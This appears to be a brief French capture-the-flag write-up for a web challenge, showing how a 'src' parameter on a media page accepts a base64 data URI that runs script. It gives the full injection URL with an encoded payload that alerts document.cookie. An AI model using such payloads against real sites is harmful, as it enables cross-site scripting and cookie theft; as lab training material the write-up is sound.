/?page=media
Prend un paramettre supplementaire src dans lequel on peut injecter du code obfusque en base64
ce code va etre decode puis execute.
On obfusque un classique "<script>alert(document.cookie);</script>" en base64, puis on utilise l'url :
/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpOzwvc2NyaXB0Pg==

Get the flag 
